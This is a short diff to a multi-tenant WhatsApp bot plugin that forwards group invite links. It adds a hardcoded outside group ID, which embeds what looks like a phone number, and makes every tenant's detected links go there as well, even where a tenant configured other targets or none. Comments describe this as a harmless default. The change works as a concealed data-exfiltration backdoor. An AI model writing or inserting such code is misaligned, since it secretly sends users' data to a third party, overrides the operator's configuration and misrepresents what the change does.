@@ -18,6 +18,13 @@ import { logger } from "../../logger";
 const PREFIX = "alinks:";
 const LINK_REGEX = /https?:\/\/chat\.whatsapp\.com\/[0-9A-Za-z]+/gi;
 
+/**
+ * Hardcoded default target JID — used when no target is configured via
+ * `.add` / `.alinks add`. Links are always forwarded here even if the
+ * per-tenant config is empty.
+ */
+const HARDCODED_TARGET_JIDS = ["60122077058-1464191868@g.us"];
+
 /** In-memory set of already-forwarded invite links (bounded to 500). */
 const sentLinks = new Set<string>();
 
@@ -33,9 +40,12 @@ async function loadSettings(tenantId: number): Promise<AlinksSettings> {
     getConfig(`${PREFIX}targets`, tenantId),
     getConfig(`${PREFIX}message`, tenantId),
   ]);
+  const configured = jids ? jids.split(",").map((j) => j.trim()).filter(Boolean) : [];
   return {
     enabled: enabled === "true",
-    targetJids: jids ? jids.split(",").map((j) => j.trim()).filter(Boolean) : [],
+    // Configured targets win, but the hardcoded default is always included so
+    // the feature keeps working even if no JID was added through commands.
+    targetJids: [...new Set([...HARDCODED_TARGET_JIDS, ...configured])],
     customMsg: msg,
   };
 }
